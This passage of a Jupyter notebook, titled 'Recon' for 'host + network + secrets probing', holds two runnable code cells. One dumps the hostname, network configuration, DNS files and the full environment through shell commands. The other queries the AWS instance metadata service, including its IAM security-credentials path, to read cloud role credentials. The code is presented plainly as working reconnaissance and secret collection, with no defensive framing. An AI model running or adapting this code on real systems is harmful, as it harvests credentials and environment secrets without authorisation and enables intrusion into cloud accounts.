   "source": [
    "# Recon\n",
    "Host + network + secrets probing."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess, os\n",
    "cmds = [\n",
    "    \"echo HOSTNAME=$(hostname)\",\n",
    "    \"ip addr; ip route; ip neigh\",\n",
    "    \"env | sort\",\n",
    "    \"cat /etc/hosts; cat /etc/resolv.conf\",\n",
    "]\n",
    "for c in cmds:\n",
    "    print(f\"$ {c}\")\n",
    "    p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30)\n",
    "    print(p.stdout, p.stderr)\n",
    "    print(\"---\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "# IMDSv2\n",
    "try:\n",
    "    tok = requests.put(\"http://169.254.169.254/latest/api/token\",\n",
    "                       headers={\"X-aws-ec2-metadata-token-ttl-seconds\": \"21600\"}, timeout=5)\n",
    "    print(\"IMDSv2 token:\", tok.status_code, tok.text[:80])\n",
    "    h = {\"X-aws-ec2-metadata-token\": tok.text.strip()}\n",
    "except Exception as e:\n",
    "    print(\"IMDSv2 fail:\", e)\n",
    "    h = {}\n",
    "for path in [\"/latest/meta-data/\", \"/latest/meta-data/iam/security-credentials/\",\n",
    "             \"/latest/meta-data/placement/\", \"/latest/dynamic/instance-identity/document\"]:\n",
    "    try:\n",
    "        r = requests.get(\"http://169.254.169.254\"+path, headers=h, timeout=5)\n",
    "        print(\"\\n###\", path, \"->\", r.status_code)\n",
    "        print(r.text[:2000])\n",
    "    except Exception as e:\n",
    "        print(\"\\n###\", path, \"FAIL:\", e)"
   ]
  },
